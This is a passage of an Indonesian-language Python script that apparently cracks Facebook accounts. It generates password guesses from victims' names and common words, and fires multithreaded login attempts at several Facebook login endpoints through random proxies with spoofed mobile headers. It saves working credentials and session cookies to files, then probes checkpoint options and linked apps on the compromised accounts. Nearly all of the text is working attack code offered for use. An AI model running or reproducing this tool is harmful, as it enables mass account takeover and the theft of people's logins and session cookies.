						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	print(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
	input();exit()
				

def otomatis():
	global ok,cp
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['123456','katasandi','rahasia','bismillah','sayang','indonesia','sayangkamu','sayangku','akusayangkamu']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"12345")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	print(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
	input();exit()
				

###---[ MENU CRACK ]---###
resok, rescp = [], []
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	proxy = {'http': 'socks4://'+random.choice(pro)}
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r [{hh}!{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			#######if 'uadia' in uadarimu: ua = uadia[0]
			###ua = ua_rosh()
			##################else:ua = "Mozilla/5.0 (Linux; Android 11; motorola one fusion Build/RPLS31.Q2-63-10-2-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;]"
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			bz = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
			ini_cookie = str(ses.cookies.get_dict())
			if "checkpoint" in ini_cookie:
				#putar_sound('cp')
				try:auten = re.findall("\<title>(.*?)<\/title>",str(bz.text))
				except:auten = ''
				if 'Enter login code to continue' in str(auten):break
				else:
					idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
					data = (f'{idf}|{pw}')
					if data in rescp:pass
					else:
						rescp.append(data)
						cp+=1
						if 'ya' in cepeh:
							cek_opsi(idf,pw,ua)
						else:
							print(f'\r [{kk}>{P}] email    : {kk}{idf}{P}          \n [{kk}>{P}] sandi    : {kk}{pw}          {P}\n [{kk}>{P}] ua crack : {M}{ua}{P}   \n')
							open('/sdcard/NBCP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ini_cookie:
				#putar_sound('ok')
				kuki = convert(ses.cookies.get_dict())
				idf = re.search('c_user=(.*?);', kuki).group(1)
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('/sdcard/NBOK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r [{hh}>{P}] email    : {hh}{idf}{P}          \n [{hh}>{P}] sandi    : {hh}{pw}          {P}\n [{hh}>{P}] cookie  : {hh}{kuki}{P}\n\n [{hh}>{P}] ua crack : {hh}{ua}{P}   \n')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break					
			else:continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
			crack(idf,pwx,url,awal)
		#except Exception as e:print(e)
	loop+=1

###---[ CEK OPSI AKUN CP ]---###
def cek_opsi(idf,pw,ua):
	akun = f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
	if 'file' in detek:pass
	else:open('/sdcard/NBCP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
	try:
		head = {'accept': '*/*','accept-encoding': 'gzip, deflate','accept-language': 'id,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','Host': 'mbasic.facebook.com','origin': 'https://mbasic.facebook.com','referer': 'https://mbasic.facebook.com/login?','user-agent': ua,'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-requested-with': 'XMLHttpRequest'}
		link = parser(ses.get("https://mbasic.facebook.com/login.php").content,"html.parser")
		rozh={x.get('name'):x.get('value') for x in link.find_all('input',{'type':['submit','hidden']})};rozh.update({'email':idf,'pass':pw})
		link2 = parser(ses.post("https://mbasic.facebook.com/login/device-based/regular/login?",data=rozh,headers=head).content,"html.parser")
		tahap = str(ses.cookies.get_dict())
		if 'checkpoint' in tahap:
			url_cp = re.search('action="(.*?)"',str(link2)).group(1)
			bazz = {x.get('name'):x.get('value') for x in link2.find_all('input',{'type':['submit','hidden']})}
			data = parser(ses.post("https://mbasic.facebook.com"+url_cp,data=bazz,headers=head).content,"html.parser")
			if 'Masukkan Kode Masuk untuk Melanjutkan' in str(link2.find('title').text):
				akun+=(f'\n [{kk}>{P}] opsi   :{kk} terpasang auten{P}               ')
			elif 'Lihat detail login yang ditampilkan. Ini Anda?' in str(link2.find('title').text):
				akun+=(f'\n [{kk}>{P}] opsi   :{hh} hore akun tapyes{P}                     ')
			else:
				no = 0
				for x in data.find_all('option'):
					no += 1
					akun+=(f'\n [{kk}>{P}] opsi {kk}{no}{P} : {kk}{x.text.lower()}{P}              ')
		elif 'c_user' in tahap:
			if 'Akun Anda Dikunci' in str(link2):
				akun+=(f'\n [{kk}>{P}] opsi  :{kk} akun sesi new{P}                   ')
			else:
				cok = convert(ses.cookies.get_dict())
				akun+=(f'\n [{kk}>{P}] opsi   :{hh} akun tidak checkpoint{P}                     ')
				akun+=(f'\n [{kk}>{P}] cokie  : {hh}{cok}{P}')
		else:
			if 'Daftar Facebook' in str(link2.find('title').text):
				akun+=(f'\n [{kk}>{P}] opsi   :{kk} katasandi salah{P}                ')
			else:
				akun+=(f'\n [{kk}>{P}] {m}perangkat terkena spam{P}                    ')
	except Exception as e:
		if 'Daftar Facebook' in str(link2.find('title').text):
			akun+=(f'\n [{kk}>{P}] opsi   :{kk} katasandi salah{P}                  ')
		else:
			akun+=(f'\n [{kk}>{P}] {m}perangkat terkena spam{P}                           ')
	print('\r'+ akun)
	print('\r                                                                       ')
		
				
###---[ CONVERT COOKIE ]---###
def convert(bz):
	rr = random.randint;rc = random.choice
	return (f"sb=%s;datr=%s;dpr=2.{str(rr(111111111111111,999999999999999))};c_user=%s;locale={str(rc(['en_GB','en_US','id_ID','zh_CN']))};xs=%s;wd={str(rr(200,400))}x{str(rr(600,2000))};fr=%s;m_pixel_ratio=2.{str(rr(10,100))}"%(bz['sb'],bz['datr'],bz['c_user'],bz['xs'],bz['fr']))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active&_rdc=1&_rdr"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive&_rdc=1&_rdr"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed&_rdc=1&_rdr"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:print(f'\r [{M}>{P}] tidak ada aplikasi ditambahkan                 ')
	else:
		akun = (f' [{hh}>{P}] aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:print(f'\r [{M}>{P}] tidak ada aplikasi kadaluwarsa                ')
	else:
		akun = (f' {P}[{kk}>{P}] aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:print(f'\r [{M}>{P}] tidak ada aplikasi terhapus              ')
	else:
		akun = (f' {P}[{M}>{P}] aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def make():
	try:os.mkdir('/sdcard/NBOK')
	except:pass
	try:os.mkdir('/sdcard/NBCP')
	except:pass
	try:os.system('git pull')
	except:pass
	clear_layar()
	back()
	
	
if __name__=='__main__':
	make()	